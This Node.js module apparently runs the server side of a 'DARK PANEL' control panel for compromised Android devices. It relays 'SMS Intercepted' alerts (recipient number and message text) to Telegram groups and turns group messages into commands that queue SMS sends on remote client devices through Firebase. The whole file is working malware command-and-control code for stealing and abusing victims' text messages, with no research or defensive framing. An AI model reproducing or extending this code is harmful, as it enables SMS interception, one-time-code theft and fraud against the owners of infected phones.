const fetch = require("node-fetch");
const crypto = require("crypto");
const db = require("./db");
const { firebasePut } = require("./firebase");

function escHtml(s) {
  return String(s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function publicBaseUrl(req) {
  const fromEnv = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL;
  if (fromEnv) return String(fromEnv).replace(/\/$/, "");
  const proto = req.headers["x-forwarded-proto"] || req.protocol || "https";
  const host = req.headers["x-forwarded-host"] || req.get("host");
  return `${proto}://${host}`;
}

function formatSmsIntercept(to, message) {
  const phone = String(to || "").trim();
  const msg = String(message || "").trim();
  return (
    `📱 SMS Intercepted\n` +
    `━━━━━━━━━━━━━━\n` +
    `📞 To: ${phone}\n` +
    `💬 Message: ${msg}\n` +
    `📋 One-tap copy:\n` +
    `${phone} | ${msg}`
  );
}

function parseSmsIntercept(text) {
  const raw = String(text || "").trim();
  if (!raw) return null;

  const toMatch = raw.match(/📞\s*To:\s*(.+)/i) || raw.match(/To:\s*([+\d][\d\s\-()]{5,})/i);
  const msgMatch = raw.match(/💬\s*Message:\s*([\s\S]+?)(?:\n📋|\nOne-tap|$)/i) ||
    raw.match(/Message:\s*([\s\S]+?)(?:\n📋|\nOne-tap|$)/i);

  if (toMatch && msgMatch) {
    const to = String(toMatch[1]).trim().replace(/\s+/g, "");
    const message = String(msgMatch[1]).trim();
    if (to && message) return { to, message };
  }

  const oneTap = raw.match(/(?:📋\s*One-tap copy:\s*\n?|^)([+\d][\d\s\-()]{5,})\s*\|\s*(.+)$/im);
  if (oneTap) {
    const to = String(oneTap[1]).trim().replace(/\s+/g, "");
    const message = String(oneTap[2]).trim();
    if (to && message) return { to, message };
  }

  const pipe = raw.match(/^([+\d][\d\s\-()]{6,})\s*\|\s*(.+)$/s);
  if (pipe) {
    const to = String(pipe[1]).trim().replace(/\s+/g, "");
    const message = String(pipe[2]).trim();
    if (to && message) return { to, message };
  }

  return null;
}

async function tgApi(token, method, body) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body || {}),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || data.ok === false) {
    throw new Error((data.description || `Telegram ${method} failed`).slice(0, 160));
  }
  return data.result;
}

async function sendWithToken(token, chatId, text, extra = {}) {
  return tgApi(token, "sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    ...extra,
  });
}

async function getMe(token) {
  return tgApi(token, "getMe", {});
}

async function setWebhook(token, url, secretToken) {
  return tgApi(token, "setWebhook", {
    url,
    secret_token: secretToken,
    allowed_updates: ["message", "channel_post", "my_chat_member"],
    drop_pending_updates: false,
  });
}

async function deleteWebhook(token) {
  try {
    await tgApi(token, "deleteWebhook", { drop_pending_updates: false });
  } catch (_) {
    /* ignore */
  }
}

function webhookUrlFor(req, userId, secret) {
  return `${publicBaseUrl(req)}/api/telegram/webhook/${encodeURIComponent(userId)}/${encodeURIComponent(secret)}`;
}

function sanitizeBot(user) {
  const bot = user.telegramBot || null;
  if (!bot || !bot.token) {
    return {
      connected: false,
      botUsername: null,
      webhookUrl: null,
      groups: [],
    };
  }
  return {
    connected: true,
    botUsername: bot.botUsername || null,
    webhookSet: !!bot.webhookSet,
    groups: (bot.groups || []).map((g) => ({
      chatId: String(g.chatId),
      title: g.title || String(g.chatId),
      type: g.type || "group",
      autoSend: g.autoSend
        ? {
            projectId: g.autoSend.projectId,
            deviceId: g.autoSend.deviceId,
            deviceName: g.autoSend.deviceName || g.autoSend.deviceId,
          }
        : null,
      addedAt: g.addedAt || null,
    })),
  };
}

async function connectBot(userId, token, req) {
  const clean = String(token || "").trim();
  if (!clean || clean.length < 20) throw new Error("Valid Telegram bot token required");

  const me = await getMe(clean);
  const secret = crypto.randomBytes(16).toString("hex");
  const url = webhookUrlFor(req, userId, secret);
  await setWebhook(clean, url, secret);

  const existing = db.getTelegramBot(userId);
  const groups = existing?.groups || [];

  db.setTelegramBot(userId, {
    token: clean,
    botUsername: me.username || me.first_name || "bot",
    botId: me.id,
    webhookSecret: secret,
    webhookSet: true,
    groups,
    connectedAt: new Date().toISOString(),
  });

  return {
    connected: true,
    botUsername: me.username || null,
    webhookUrl: url,
    groups: sanitizeBot(db.findUserById(userId)).groups,
  };
}

async function disconnectBot(userId) {
  const bot = db.getTelegramBot(userId);
  if (bot?.token) await deleteWebhook(bot.token);
  db.clearTelegramBot(userId);
  return { connected: false };
}

async function refreshWebhook(userId, req) {
  const bot = db.getTelegramBot(userId);
  if (!bot?.token) throw new Error("Connect bot first");
  const secret = bot.webhookSecret || crypto.randomBytes(16).toString("hex");
  const url = webhookUrlFor(req, userId, secret);
  await setWebhook(bot.token, url, secret);
  db.setTelegramBot(userId, { ...bot, webhookSecret: secret, webhookSet: true });
  return { ok: true, webhookUrl: url };
}

function upsertGroup(userId, { chatId, title, type }) {
  const id = String(chatId);
  if (!id) throw new Error("chatId required");
  const bot = db.getTelegramBot(userId) || { groups: [] };
  const groups = bot.groups || [];
  const idx = groups.findIndex((g) => String(g.chatId) === id);
  const row = {
    chatId: id,
    title: title || (idx >= 0 ? groups[idx].title : id),
    type: type || (idx >= 0 ? groups[idx].type : "group"),
    autoSend: idx >= 0 ? groups[idx].autoSend : null,
    addedAt: idx >= 0 ? groups[idx].addedAt : new Date().toISOString(),
  };
  if (idx >= 0) groups[idx] = row;
  else groups.push(row);
  db.setTelegramBot(userId, { ...bot, groups });
  return row;
}

function deleteGroup(userId, chatId) {
  const bot = db.getTelegramBot(userId);
  if (!bot) throw new Error("Bot not connected");
  const before = (bot.groups || []).length;
  bot.groups = (bot.groups || []).filter((g) => String(g.chatId) !== String(chatId));
  if (bot.groups.length === before) throw new Error("Group not found");
  db.setTelegramBot(userId, bot);
  return { ok: true };
}

function setGroupAutoSend(userId, chatId, autoSend) {
  const bot = db.getTelegramBot(userId);
  if (!bot) throw new Error("Bot not connected");
  const g = (bot.groups || []).find((x) => String(x.chatId) === String(chatId));
  if (!g) throw new Error("Group not found — add bot to group first");
  g.autoSend = autoSend
    ? {
        projectId: String(autoSend.projectId),
        deviceId: String(autoSend.deviceId),
        deviceName: String(autoSend.deviceName || autoSend.deviceId),
      }
    : null;
  db.setTelegramBot(userId, bot);
  return g;
}

function clearDeviceAutoSend(userId, deviceId) {
  const bot = db.getTelegramBot(userId);
  if (!bot) return { ok: true, cleared: 0 };
  let cleared = 0;
  for (const g of bot.groups || []) {
    if (g.autoSend && String(g.autoSend.deviceId) === String(deviceId)) {
      g.autoSend = null;
      cleared += 1;
    }
  }
  db.setTelegramBot(userId, bot);
  return { ok: true, cleared };
}

function findDeviceAutoSend(userId, deviceId) {
  const bot = db.getTelegramBot(userId);
  if (!bot) return null;
  const g = (bot.groups || []).find(
    (x) => x.autoSend && String(x.autoSend.deviceId) === String(deviceId)
  );
  if (!g) return null;
  return {
    chatId: String(g.chatId),
    title: g.title || String(g.chatId),
    type: g.type || "group",
    autoSend: g.autoSend,
  };
}

async function refreshGroupTitles(userId) {
  const bot = db.getTelegramBot(userId);
  if (!bot?.token) throw new Error("Bot not connected");
  const groups = bot.groups || [];
  let updated = 0;
  for (const g of groups) {
    try {
      const chat = await tgApi(bot.token, "getChat", { chat_id: g.chatId });
      const title = chat.title || chat.username || g.title || String(g.chatId);
      const type = chat.type || g.type || "group";
      if (title !== g.title || type !== g.type) {
        g.title = title;
        g.type = type;
        updated += 1;
      }
    } catch (_) {
      /* chat may be gone */
    }
  }
  db.setTelegramBot(userId, bot);
  return {
    ok: true,
    updated,
    groups: sanitizeBot(db.findUserById(userId)).groups,
  };
}

async function queueDeviceSms(userId, projectId, deviceId, to, message, from = 1, meta = null) {
  const started = Date.now();
  const project = db.getFirebaseProject(userId, projectId);
  await firebasePut(
    project.firebaseUrl,
    project.firebaseSecret,
    `clients/${deviceId}/webhookEvent/sendSms`,
    {
      from: from || 1,
      to: String(to),
      message: String(message),
      isSended: false,
      queuedAt: Date.now(),
    }
  );
  const ms = Date.now() - started;
  if (meta) {
    db.pushAutoSendEvent(userId, {
      ms,
      deviceId,
      deviceName: meta.deviceName || deviceId,
      groupTitle: meta.groupTitle,
      chatId: meta.chatId,
      to,
      preview: message,
      source: meta.source || "bot",
    });
  }
  return { ms };
}

async function postInterceptToGroup(userId, chatId, to, message) {
  const bot = db.getTelegramBot(userId);
  if (!bot?.token) throw new Error("Bot not connected");
  const text = formatSmsIntercept(to, message);
  await sendWithToken(bot.token, chatId, text);
  return { ok: true };
}

function chatFromUpdate(update) {
  const msg = update.message || update.channel_post;
  if (msg?.chat) return msg.chat;
  const mcm = update.my_chat_member;
  if (mcm?.chat) return mcm.chat;
  return null;
}

async function handleWebhook(userId, secret, update, headerSecret) {
  const bot = db.getTelegramBot(userId);
  if (!bot?.token || !bot.webhookSecret) return { ok: false, error: "not configured" };
  if (String(secret) !== String(bot.webhookSecret)) return { ok: false, error: "bad secret" };
  if (headerSecret && String(headerSecret) !== String(bot.webhookSecret)) {
    return { ok: false, error: "bad header" };
  }

  const chat = chatFromUpdate(update);
  if (!chat) return { ok: true };

  // Bot added / status change in group or channel
  if (update.my_chat_member) {
    const status = update.my_chat_member.new_chat_member?.status;
    const isMember = ["member", "administrator", "creator"].includes(status);
    if (isMember && ["group", "supergroup", "channel"].includes(chat.type)) {
      const row = upsertGroup(userId, {
        chatId: chat.id,
        title: chat.title || chat.username || String(chat.id),
        type: chat.type,
      });
      try {
        await sendWithToken(
          bot.token,
          chat.id,
          `✅ <b>DARK PANEL bot connected</b>\n\n` +
            `Type: <code>${escHtml(chat.type)}</code>\n` +
            `ID: <code>${escHtml(String(chat.id))}</code>\n` +
            `Title: <b>${escHtml(row.title)}</b>\n\n` +
            `Panel me groups list me dikhega. Device detail → Send Auto se bind karo.`
        );
      } catch (_) {
        /* channels may block send without admin */
      }
    } else if (status === "left" || status === "kicked") {
      try {
        deleteGroup(userId, chat.id);
      } catch (_) {
        /* already gone */
      }
    }
    return { ok: true };
  }

  const msg = update.message || update.channel_post;
  const text = msg?.text || msg?.caption || "";

  // Auto-register any group/channel the bot can see (name + id)
  if (chat && ["group", "supergroup", "channel"].includes(chat.type)) {
    upsertGroup(userId, {
      chatId: chat.id,
      title: chat.title || chat.username || String(chat.id),
      type: chat.type,
    });
  }

  if (!text) return { ok: true };

  // /id helper
  if (/^\/id\b/i.test(text.trim())) {
    await sendWithToken(
      bot.token,
      chat.id,
      `Chat ID: <code>${escHtml(String(chat.id))}</code>\nType: <code>${escHtml(chat.type)}</code>`
    );
    if (["group", "supergroup", "channel"].includes(chat.type)) {
      upsertGroup(userId, {
        chatId: chat.id,
        title: chat.title || chat.username || String(chat.id),
        type: chat.type,
      });
    }
    return { ok: true };
  }

  const parsed = parseSmsIntercept(text);
  if (!parsed) return { ok: true };

  const fresh = db.getTelegramBot(userId);
  const group = (fresh.groups || []).find((g) => String(g.chatId) === String(chat.id));
  if (!group?.autoSend?.projectId || !group?.autoSend?.deviceId) {
    try {
      await sendWithToken(
        bot.token,
        chat.id,
        `⚠️ SMS format mila, lekin is group pe koi device bind nahi.\nPanel / APK → Send Auto se device link karo.`
      );
    } catch (_) {}
    return { ok: true, skipped: "no autoSend" };
  }

  const started = Date.now();
  try {
    const queued = await queueDeviceSms(
      userId,
      group.autoSend.projectId,
      group.autoSend.deviceId,
      parsed.to,
      parsed.message,
      1,
      {
        deviceName: group.autoSend.deviceName,
        groupTitle: group.title,
        chatId: String(chat.id),
        source: "bot",
      }
    );
    const ms = queued?.ms ?? Date.now() - started;
    try {
      await sendWithToken(
        bot.token,
        chat.id,
        `⚡ Auto SMS queued in <b>${ms}ms</b>\nDevice: <code>${escHtml(group.autoSend.deviceName || group.autoSend.deviceId)}</code>\nGroup: <b>${escHtml(group.title || chat.id)}</b>\nTo: <code>${escHtml(parsed.to)}</code>`
      );
    } catch (_) {}
    return { ok: true, queued: true, ms };
  } catch (err) {
    try {
      await sendWithToken(bot.token, chat.id, `❌ Auto SMS failed: ${escHtml(err.message)}`);
    } catch (_) {}
    return { ok: false, error: err.message };
  }
}

module.exports = {
  formatSmsIntercept,
  parseSmsIntercept,
  sanitizeBot,
  connectBot,
  disconnectBot,
  refreshWebhook,
  upsertGroup,
  deleteGroup,
  setGroupAutoSend,
  clearDeviceAutoSend,
  findDeviceAutoSend,
  refreshGroupTitles,
  queueDeviceSms,
  postInterceptToGroup,
  handleWebhook,
  publicBaseUrl,
  webhookUrlFor,
};
